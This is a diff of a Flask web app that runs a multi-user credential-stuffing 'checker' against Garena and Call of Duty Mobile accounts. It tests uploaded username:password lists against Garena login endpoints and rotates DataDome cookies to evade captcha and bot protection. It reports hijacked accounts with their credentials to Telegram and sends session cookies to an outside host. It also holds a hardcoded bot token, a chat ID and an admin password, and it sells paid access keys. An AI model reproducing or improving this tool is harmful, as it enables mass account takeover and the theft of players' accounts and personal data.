@@ -1,6 +1,4 @@
-#--- START OF FILE app.py ---
-
-# --- START OF FILE app.py ---
+# --- START OF MERGED V1.py ---
 
 import os
 import sys
@@ -28,7 +26,7 @@ from flask import Flask, render_template, request, jsonify, redirect, url_for, s
 from werkzeug.utils import secure_filename
 from werkzeug.security import generate_password_hash, check_password_hash
 
-# --- CONFIGURATION (MODIFIED FOR VERCEL) ---
+# --- CONFIGURATION (MODIFIED FOR VERCEL & MULTI-USER) ---
 ADMIN_TELEGRAM_BOT_TOKEN = os.environ.get("ADMIN_TELEGRAM_BOT_TOKEN", "8075069522:AAE0lI5FgjWw7jebgzJR1JM1kBo2lgITtgI")
 ADMIN_TELEGRAM_CHAT_ID = os.environ.get("ADMIN_TELEGRAM_CHAT_ID", "5163892491")
 BASE_TMP_DIR = '/tmp'
@@ -58,7 +56,7 @@ init(autoreset=True)
 # --- Flask App Setup ---
 app = Flask(__name__)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
-app.secret_key = os.environ.get("FLASK_SECRET_KEY", "you-must-set-a-very-secret-key")
+app.secret_key = os.environ.get("FLASK_SECRET_KEY", "a-very-secure-and-random-secret-key-is-required")
 
 for folder in [DATA_DIR, UPLOAD_FOLDER, RESULTS_BASE_DIR, LOGS_BASE_DIR, APP_DATA_DIR]:
     os.makedirs(folder, exist_ok=True)
@@ -106,6 +104,7 @@ def load_data(file_path):
 
 def save_data(data, file_path):
     try:
+        os.makedirs(os.path.dirname(file_path), exist_ok=True)
         with open(file_path, 'w') as f: json.dump(data, f, indent=4)
     except IOError as e:
         print(f"Error saving data to {file_path}: {e}") # Log to server console
@@ -115,7 +114,7 @@ def init_admin_user():
     if not any(u['username'] == 'admin' for u in users):
         admin_user = {
             "username": "admin",
-            "password_hash": generate_password_hash("kenzen03"),
+            "password_hash": generate_password_hash("kenzen0325"), # <-- ADMIN PASSWORD CHANGED
             "email": "admin@checker.local",
             "upgrade_expires_at": (datetime.now() + timedelta(days=365*10)).isoformat(), # Permanent admin
             "registered_at": datetime.now().isoformat()
@@ -134,7 +133,7 @@ def is_user_upgraded(user_data):
         return datetime.fromisoformat(expires_at_str) > datetime.now()
     except (ValueError, TypeError): return False
 
-# --- Helper Functions (Checker Logic) ---
+# --- Helper Functions (Checker Logic, Adapted for Multi-User) ---
 def log_message(user_session, message, color_class='text-white'):
     if not user_session: return
     clean_message = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]').sub('', message)
@@ -149,7 +148,7 @@ def get_logs_directory(): return LOGS_BASE_DIR
 def get_results_directory(): return RESULTS_BASE_DIR
 
 def save_telegram_config(user_session, token, chat_id):
-    config_path = os.path.join(get_app_data_directory(), "telegram_config.json")
+    config_path = os.path.join(get_app_data_directory(), f"telegram_config_{session['user']['username']}.json")
     config = {'bot_token': token, 'chat_id': chat_id}
     try:
         with open(config_path, 'w') as f: json.dump(config, f, indent=4)
@@ -157,7 +156,8 @@ def save_telegram_config(user_session, token, chat_id):
     except IOError as e: log_message(user_session, f"Error saving Telegram config: {e}", "text-danger")
 
 def load_telegram_config():
-    config_path = os.path.join(get_app_data_directory(), "telegram_config.json")
+    if 'user' not in session: return None, None
+    config_path = os.path.join(get_app_data_directory(), f"telegram_config_{session['user']['username']}.json")
     if not os.path.exists(config_path): return None, None
     try:
         with open(config_path, 'r') as f:
@@ -260,7 +260,7 @@ def check_login(user_session, account_username, _id, encryptedpassword, password
     coke["datadome"] = dataa
     coke["sso_key"] = sso_key
     if successful_token: coke["token_session"] = successful_token
-    hider = {'Host': 'account.garena.com', 'Connection': 'keep-alive', 'User-Agent': selected_header["User-Agent"], 'Accept': 'application/json, text/plain, */*', 'Referer': f'https://account.garena.com/?session_key={session_key}'}
+    hider = {'Host': 'account.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"', 'sec-ch-ua-mobile': '?1', 'User-Agent': selected_header["User-Agent"], 'Accept': 'application/json, text/plain, */*', 'Referer': f'https://account.garena.com/?session_key={session_key}', 'Accept-Language': 'en-US,en;q=0.9'}
     init_url = 'http://gakumakupal.x10.bz/patal.php'
     params = {f'coke_{k}': v for k, v in coke.items()}
     params.update({f'hider_{k}': v for k, v in hider.items()})
@@ -289,8 +289,8 @@ def check_login(user_session, account_username, _id, encryptedpassword, password
             elif key == "Two-Step Verification": two_step_enabled = "True"
         except ValueError: continue
     save_datadome_cookie(user_session, dataa)
-    head = {"Host": "auth.garena.com", "Accept": "application/json, text/plain, */*", "User-Agent": selected_header["User-Agent"], "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "Origin": "https://auth.garena.com", "Referer": "https://auth.garena.com/"}
-    data_payload = {"client_id": "100082", "response_type": "token", "redirect_uri": redrov, "format": "json", "id": _id}
+    head = {"Host": "auth.garena.com", "Connection": "keep-alive", "Accept": "application/json, text/plain, */*", "User-Agent": selected_header["User-Agent"], "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "Origin": "https://auth.garena.com", "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"}
+    data_payload = {"client_id": "100082", "response_type": "token", "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/", "format": "json", "id": _id}
     try:
         grant_url = "https://auth.garena.com/oauth/token/grant"
         reso = requests.post(grant_url, headers=head, data=data_payload, cookies=coke)
@@ -338,15 +338,21 @@ def format_result(last_login, country, shell, mobile, facebook, email_verified, 
     has_codm = "No CODM account found" not in connected_games[0]
     console_message = f"""[✅] GARENA ACCOUNT HIT
    [🔑 Credentials]
-      User: {username} | Pass: {password}
+      User: {username}
+      Pass: {password}
    [📊 Information]
-      Country: {country} | Shells: {shell} 💰 | Last Login: {last_login}
-      Email: {email} {email_ver_text} | Facebook: {fb}
+      Country: {country}
+      Shells: {shell} 💰
+      Last Login: {last_login}
+      Email: {email} {email_ver_text}
+      Facebook: {fb}
    [🎮 CODM Details]
       {connected_games[0].replace(chr(10), chr(10) + "      ")}
    [🛡️ Security]
-      Status: {is_clean_text} | Mobile Bind: {bool_status_text('True' if mobile != 'N/A' else 'False')}
-      Facebook Link: {bool_status_text(facebook)} | 2FA Enabled: {bool_status_text(two_step_enabled)}
+      Status: {is_clean_text}
+      Mobile Bind: {bool_status_text('True' if mobile != 'N/A' else 'False')}
+      Facebook Link: {bool_status_text(facebook)}
+      2FA Enabled: {bool_status_text(two_step_enabled)}
       Authenticator: {bool_status_text(authenticator_enabled)}
       - Presented By: @KenshiKupal -""".strip()
     codm_level_num = int(codm_level) if isinstance(codm_level, str) and codm_level.isdigit() else 0
@@ -364,7 +370,8 @@ def format_result(last_login, country, shell, mobile, facebook, email_verified, 
   <b>Pass:</b> <code>{s_pass}</code>
 - - - - - - - - - - - - - - - - -
 📊  <b><u>Account Info:</u></b>
-  <b>Country:</b> {s_country} | <b>Shells:</b> {shell} 💰
+  <b>Country:</b> {s_country}
+  <b>Shells:</b> {shell} 💰
   <b>Last Login:</b> {s_last_login}
   <b>Email:</b> <code>{s_email}</code> {tg_email_ver}
   <b>Facebook:</b> <code>{s_fb}</code>
@@ -400,7 +407,7 @@ def format_result(last_login, country, shell, mobile, facebook, email_verified, 
 
 def get_request_data(selected_cookie_module):
     cookies = selected_cookie_module.get_cookies()
-    headers = {'Host': 'auth.garena.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36', 'Referer': 'https://auth.garena.com/'}
+    headers = {'Host': 'auth.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36', 'sec-ch-ua-platform': '"Android"', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'}
     return cookies, headers
 
 def check_account(user_session, username, password, date, datadome_cookie, selected_cookie_module):
@@ -410,8 +417,8 @@ def check_account(user_session, username, password, date, datadome_cookie, selec
             random_id = "17290585" + str(random.randint(10000, 99999))
             cookies, headers = get_request_data(selected_cookie_module)
             if datadome_cookie: cookies['datadome'] = datadome_cookie
-            params = {"app_id": "100082", "account": username, "format": "json", "id": random_id}
-            response = requests.get("https://auth.garena.com/api/prelogin", params=params, cookies=cookies, headers=headers, timeout=20)
+            params, login_url = {"app_id": "100082", "account": username, "format": "json", "id": random_id}, "https://auth.garena.com/api/prelogin"
+            response = requests.get(login_url, params=params, cookies=cookies, headers=headers, timeout=20)
             if "captcha" in response.text.lower(): return "[CAPTCHA]"
             if response.status_code == 200:
                 data = response.json()
@@ -477,13 +484,11 @@ def clear_progress(username):
 
 def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_cookie_module_name, use_cookie_set, auto_delete, force_restart, telegram_level_filter, fixed_cookie_number, user_info, user_session):
     log_message(user_session, "[⚠️ VERCEL NOTE] Checker is running on a serverless platform. Task will be terminated after the timeout limit.", "text-warning")
-
     status_lock = user_session['status_lock']
     stop_event = user_session['stop_event']
     captcha_pause_event = user_session['captcha_pause_event']
     check_status = user_session['status']
     username = user_info['username']
-
     is_complete = False
     try:
         if force_restart:
@@ -494,23 +499,18 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
         if progress_data and progress_data.get('source_file_path') == file_path:
             start_from_index = progress_data.get('last_processed_index', -1) + 1
             if start_from_index > 0: log_message(user_session, f"[🔄] Resuming session from line {start_from_index + 1}.", "text-info")
-        
         selected_cookie_module = getattr(sys.modules[__name__], selected_cookie_module_name)
         if selected_cookie_module_name == 'set_cookie' and fixed_cookie_number > 0:
             set_cookie.set_fixed_number(fixed_cookie_number)
             log_message(user_session, f"[⚙️] Numbered Set is locked to use ONLY cookie #{fixed_cookie_number}.", "text-info")
-
         stats = { 'successful': 0, 'failed': 0, 'clean': 0, 'not_clean': 0, 'incorrect_pass': 0, 'no_exist': 0, 'other_fail': 0, 'telegram_sent': 0, 'captcha_count': 0 }
         failed_file = os.path.join(get_logs_directory(), f"failed_{username}_{datenok}.txt")
         accounts, total_accounts = remove_duplicates_from_file(user_session, file_path)
-        
         if user_info and not is_user_upgraded(user_info) and total_accounts > 100:
             log_message(user_session, f"[⚠️] Free account limit reached. Processing only the first 100 lines out of {total_accounts}.", "text-warning")
             accounts, total_accounts = accounts[:100], 100
-
         accounts_to_process = accounts[start_from_index:]
         with status_lock: check_status.update({'total': total_accounts, 'progress': start_from_index, 'stats': stats})
-
         cookie_state = {'pool': [], 'index': -1, 'cooldown': {}}
         if use_cookie_set:
             cookie_state['pool'] = [c.get('datadome') for c in cookie_config.COOKIE_POOL if c.get('datadome')]
@@ -521,71 +521,51 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                 loaded_cookies = load_data(cookie_file)
                 if isinstance(loaded_cookies, list): cookie_state['pool'] = [c.get('datadome') for c in loaded_cookies if 'datadome' in c]
                 log_message(user_session, f"[🍪] Loaded {len(cookie_state['pool'])} DataDome cookies from local pool.", "text-info")
-
         if not cookie_state['pool']:
             log_message(user_session, "[⚠️] DataDome cookie pool is empty. Fetching new ones...", "text-warning")
             cookie_state['pool'] = fetch_new_datadome_pool(user_session)
             if not cookie_state['pool']:
                 log_message(user_session, "[❌] Failed to get any DataDome cookies. Stopping.", "text-danger")
                 stop_event.set()
-
         for loop_idx, acc in enumerate(accounts_to_process):
             original_index = start_from_index + loop_idx
             if stop_event.is_set(): log_message(user_session, "Checker stopped by user.", "text-warning"); break
             with status_lock: check_status.update({'progress': original_index, 'current_account': acc})
-            
             if ':' in acc:
                 username_acc, password = acc.split(':', 1)
                 is_captcha_loop = True
                 while is_captcha_loop and not stop_event.is_set():
                     current_datadome = None
-                    if not cookie_state['pool']: 
+                    if not cookie_state['pool']:
                         log_message(user_session, "[❌] No cookies available in the pool. Stopping check.", "text-danger")
-                        stop_event.set()
-                        break
-                    
+                        stop_event.set(); break
                     for _ in range(len(cookie_state['pool'])):
                         cookie_state['index'] = (cookie_state['index'] + 1) % len(cookie_state['pool'])
                         potential_cookie = cookie_state['pool'][cookie_state['index']]
-                        
                         cooldown_until = cookie_state['cooldown'].get(potential_cookie)
-                        if cooldown_until and time.time() < cooldown_until:
-                            continue 
-                        current_datadome = potential_cookie
-                        break
-
-                    if not current_datadome: 
+                        if cooldown_until and time.time() < cooldown_until: continue
+                        current_datadome = potential_cookie; break
+                    if not current_datadome:
                         log_message(user_session, "[❌] All available cookies are on cooldown. Please wait or add new cookies.", "text-danger")
-                        stop_event.set()
-                        break
-
+                        stop_event.set(); break
                     log_message(user_session, f"[▶] Checking: {username_acc}:{password} with cookie ...{current_datadome[-6:]}", "text-info")
                     result = check_account(user_session, username_acc, password, datenok, current_datadome, selected_cookie_module)
-
-                    if result == "[CAPTCHA]":
+                    if result == "[CAPTCHA]": # <-- PRESERVED CAPTCHA HANDLER LOGIC
                         stats['captcha_count'] += 1
                         log_message(user_session, f"[🔴 CAPTCHA] Triggered by cookie ...{current_datadome[-6:]}", "text-danger")
-                        
                         expiry_time = time.time() + 300
                         cookie_state['cooldown'][current_datadome] = expiry_time
                         log_message(user_session, f"[⏳] Cookie placed on cooldown for 5 minutes.", "text-warning")
-
                         with status_lock: check_status['captcha_detected'] = True
                         time.sleep(random.uniform(2, 4))
-                        
                         captcha_pause_event.clear()
-                        captcha_pause_event.wait(timeout=30) # Add timeout for serverless env
-                        
+                        captcha_pause_event.wait(timeout=30)
                         with status_lock: check_status['captcha_detected'] = False
-                        
                         if stop_event.is_set(): break
                         log_message(user_session, "[🔄] Resuming check for the same account...", "text-info")
-                        continue
-                    else:
-                        is_captcha_loop = False
-
+                        continue # End of preserved block
+                    else: is_captcha_loop = False
                 if stop_event.is_set(): break
-                
                 if isinstance(result, tuple):
                     console_message, telegram_message, codm_level_num, _, user_res, _, _, _, is_clean, file_to_write, content_to_write = result
                     log_message(user_session, console_message, "text-success")
@@ -606,10 +586,8 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                     with open(failed_file, 'a', encoding='utf-8') as failed_out: failed_out.write(f"{username_acc}:{password} - {result}\n")
                     log_message(user_session, f"User: {username_acc} | Pass: {password} ➔ {result}", "text-danger")
             else: log_message(user_session, f"Invalid format: {acc} ➔ Skipping", "text-warning")
-            
             with status_lock: check_status['stats'] = stats.copy()
             save_progress(username, file_path, original_index)
-        
         if not stop_event.is_set():
             is_complete = True
             with status_lock:
@@ -645,16 +623,12 @@ def index():
     users = load_data(USERS_FILE)
     current_user = next((u for u in users if u['username'] == session['user']['username']), None)
     if current_user:
-        session['user'] = current_user
-        session.modified = True
-    else: # If user was deleted, log them out
-        session.pop('user', None)
-        return redirect(url_for('login'))
-    
+        session['user'] = current_user; session.modified = True
+    else:
+        session.pop('user', None); return redirect(url_for('login'))
     user_session = get_or_create_user_session(session['user']['username'])
     if not user_session['status']['running'] and not user_session['status']['logs']:
          log_message(user_session, f"Welcome, {session['user']['username']}! The app is ready.", "text-info")
-
     bot_token, chat_id = load_telegram_config()
     return render_template('index.html', bot_token=bot_token or '', chat_id=chat_id or '', user=session['user'])
 
@@ -670,8 +644,7 @@ def login():
             session['user'] = user
             flash('Logged in successfully!', 'success')
             return redirect(url_for('index'))
-        else:
-            flash('Invalid username or password.', 'danger')
+        else: flash('Invalid username or password.', 'danger')
     return render_template('login.html')
 
 @app.route('/register', methods=['GET', 'POST'])
@@ -683,76 +656,63 @@ def register():
         password = request.form['password']
         confirm_password = request.form['confirm_password']
         if password != confirm_password:
-            flash('Passwords do not match.', 'danger')
-            return redirect(url_for('register'))
+            flash('Passwords do not match.', 'danger'); return redirect(url_for('register'))
         users = load_data(USERS_FILE)
         if any(u['username'] == username for u in users):
-            flash('Username already exists.', 'danger')
-            return redirect(url_for('register'))
-        new_user = {
-            "username": username, "password_hash": generate_password_hash(password),
-            "email": email, "upgrade_expires_at": None,
-            "registered_at": datetime.now().isoformat()
-        }
-        users.append(new_user)
-        save_data(users, USERS_FILE)
+            flash('Username already exists.', 'danger'); return redirect(url_for('register'))
+        new_user = { "username": username, "password_hash": generate_password_hash(password), "email": email, "upgrade_expires_at": None, "registered_at": datetime.now().isoformat() }
+        users.append(new_user); save_data(users, USERS_FILE)
         flash('Registration successful! Please log in.', 'success')
         return redirect(url_for('login'))
     return render_template('register.html')
 
 @app.route('/logout')
 def logout():
-    session.pop('user', None)
+    if 'user' in session:
+        username = session['user']['username']
+        user_session = get_or_create_user_session(username)
+        # --- NEW: AUTO-STOP ON LOGOUT ---
+        with user_session['status_lock']:
+            if user_session['status']['running']:
+                user_session['status']['stop_requested'] = True
+                user_session['stop_event'].set()
+                if not user_session['captcha_pause_event'].is_set():
+                    user_session['captcha_pause_event'].set()
+                log_message(user_session, "User logged out. Sending stop signal to running check...", "text-warning")
+        # --- END OF NEW LOGIC ---
+        session.pop('user', None)
     flash('You have been logged out.', 'info')
     return redirect(url_for('login'))
 
 @app.route('/start_check', methods=['POST'])
 def start_check():
     if 'user' not in session: return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
-    
     username = session['user']['username']
     user_session = get_or_create_user_session(username)
-
     with user_session['status_lock']:
-        if user_session['status']['running']: 
+        if user_session['status']['running']:
             return jsonify({'status': 'error', 'message': 'A check is already running for your account.'}), 400
-        
-        user_session['status'].update({
-            'running': True, 'progress': 0, 'total': 0, 'logs': [], 'stats': {},
-            'final_summary': None, 'captcha_detected': False, 'stop_requested': False, 'current_account': ''
-        })
-        user_session['stop_event'].clear()
-        user_session['captcha_pause_event'].clear()
-
+        user_session['status'].update({ 'running': True, 'progress': 0, 'total': 0, 'logs': [], 'stats': {}, 'final_summary': None, 'captcha_detected': False, 'stop_requested': False, 'current_account': '' })
+        user_session['stop_event'].clear(); user_session['captcha_pause_event'].clear()
     file = request.files.get('account_file')
     if not file or file.filename == '':
-        flash('No account file selected.', 'danger')
-        return redirect(url_for('index'))
-    filename = secure_filename(file.filename)
+        flash('No account file selected.', 'danger'); return redirect(url_for('index'))
+    filename = secure_filename(f"{username}_{file.filename}")
     file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
     file.save(file_path)
-    
     bot_token = request.form.get('telegram_bot_token')
     chat_id = request.form.get('telegram_chat_id')
     if 'save_telegram_creds' in request.form and bot_token and chat_id:
         save_telegram_config(user_session, bot_token, chat_id)
-        
     cookie_module = request.form.get('cookie_module', 'ken_cookie')
     cookie_number = request.form.get('cookie_number', type=int, default=0)
     use_cookie_set = 'use_cookie_set' in request.form
     auto_delete = 'auto_delete' in request.form
     force_restart = 'force_restart' in request.form
     telegram_level_filter = request.form.get('telegram_level_filter', 'none')
-
     log_message(user_session, "Starting new check...", "text-info")
-    
-    thread = threading.Thread(target=run_check_task, args=(
-        file_path, bot_token, chat_id, cookie_module, use_cookie_set, 
-        auto_delete, force_restart, telegram_level_filter, cookie_number, 
-        session['user'], user_session
-    ))
-    thread.daemon = True
-    thread.start()
+    thread = threading.Thread(target=run_check_task, args=( file_path, bot_token, chat_id, cookie_module, use_cookie_set, auto_delete, force_restart, telegram_level_filter, cookie_number, session['user'], user_session ))
+    thread.daemon = True; thread.start()
     user_session['thread'] = thread
     return redirect(url_for('index'))
 
@@ -761,25 +721,24 @@ def get_status():
     if 'user' not in session: return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
     username = session['user']['username']
     user_session = get_or_create_user_session(username)
+    with user_session['status_lock']: return jsonify(user_session['status'])
+
+def trigger_stop(username):
+    user_session = get_or_create_user_session(username)
     with user_session['status_lock']:
-        return jsonify(user_session['status'])
+        if not user_session['status']['running']:
+            return jsonify({'status': 'info', 'message': 'Checker not running.'})
+        user_session['status']['stop_requested'] = True
+    user_session['stop_event'].set()
+    if not user_session['captcha_pause_event'].is_set():
+        user_session['captcha_pause_event'].set()
+    log_message(user_session, "Stop request received. Shutting down gracefully...", "text-warning")
+    return jsonify({'status': 'success', 'message': 'Stop signal sent.'})
 
 @app.route('/stop_check', methods=['POST'])
 def stop_check_route():
     if 'user' not in session: return jsonify({'status': 'error', 'message': 'Authentication required.'}), 401
-    username = session['user']['username']
-    user_session = get_or_create_user_session(username)
-    with user_session['status_lock']:
-        if not user_session['status']['running']: 
-            return jsonify({'status': 'info', 'message': 'Checker not running.'})
-        user_session['status']['stop_requested'] = True
-    
-    user_session['stop_event'].set()
-    if not user_session['captcha_pause_event'].is_set():
-        user_session['captcha_pause_event'].set()
-        
-    log_message(user_session, "Stop request received. Shutting down gracefully...", "text-warning")
-    return jsonify({'status': 'success', 'message': 'Stop signal sent.'})
+    return trigger_stop(session['user']['username'])
 
 @app.route('/captcha_action', methods=['POST'])
 def captcha_action():
@@ -788,7 +747,6 @@ def captcha_action():
     user_session = get_or_create_user_session(username)
     action = request.form.get('action')
     log_message(user_session, f"Captcha action received: {action}", "text-info")
-    
     if action == 'fetch_pool':
         new_pool = fetch_new_datadome_pool(user_session, num_cookies=5)
         if new_pool:
@@ -797,7 +755,6 @@ def captcha_action():
     elif action == 'retry_ip': log_message(user_session, "[IP] Assuming IP has been changed. Retrying...", "text-info")
     elif action == 'stop_checker': return stop_check_route()
     elif action == 'next_cookie': log_message(user_session, "[🔄] Attempting to use next available cookie.", "text-info")
-    
     user_session['captcha_pause_event'].set()
     return jsonify({'status': 'success', 'message': 'Action processed.'})
 
@@ -814,8 +771,7 @@ def redeem_key():
         current_user = next((u for u in users if u['username'] == session['user']['username']), None)
         if current_user:
             current_user['upgrade_expires_at'] = expiration_date.isoformat()
-            session['user'] = current_user
-            session.modified = True
+            session['user'] = current_user; session.modified = True
         save_data(keys, KEYS_FILE); save_data(users, USERS_FILE)
         flash(f'Key redeemed successfully! Your account has been upgraded for {duration_days} days.', 'success')
     else: flash('Invalid or already used key.', 'danger')
@@ -843,24 +799,15 @@ def get_admin_data():
         if expires_at_str:
             try:
                 expires_at = datetime.fromisoformat(expires_at_str)
-                if expires_at > datetime.now():
-                    time_left = expires_at - datetime.now()
-                    days, remainder = divmod(time_left.total_seconds(), 86400)
-                    hours, remainder = divmod(remainder, 3600)
-                    minutes, _ = divmod(remainder, 60)
-                    user_copy['status'] = 'Active'
-                    user_copy['time_left'] = f"{int(days)}d {int(hours)}h {int(minutes)}m"
-                else:
-                    user_copy.update({'status': 'Expired', 'time_left': '---'})
-            except (ValueError, TypeError):
-                user_copy.update({'status': 'Free', 'time_left': '---'})
-        else:
-            user_copy.update({'status': 'Free', 'time_left': '---'})
+                time_left = expires_at - datetime.now()
+                if time_left.total_seconds() > 0:
+                    days, rem = divmod(time_left.total_seconds(), 86400); hours, rem = divmod(rem, 3600); minutes, _ = divmod(rem, 60)
+                    user_copy.update({'status': 'Active', 'time_left': f"{int(days)}d {int(hours)}h {int(minutes)}m"})
+                else: user_copy.update({'status': 'Expired', 'time_left': '---'})
+            except (ValueError, TypeError): user_copy.update({'status': 'Free', 'time_left': '---'})
+        else: user_copy.update({'status': 'Free', 'time_left': '---'})
         processed_users.append(user_copy)
-    return jsonify({
-        "users": sorted(processed_users, key=lambda x: x['registered_at'], reverse=True),
-        "keys": sorted(keys, key=lambda x: x['generated_at'], reverse=True)
-    })
+    return jsonify({"users": sorted(processed_users, key=lambda x: x['registered_at'], reverse=True), "keys": sorted(keys, key=lambda x: x['generated_at'], reverse=True)})
 
 @app.route('/admin/post_announcement', methods=['POST'])
 def post_announcement():
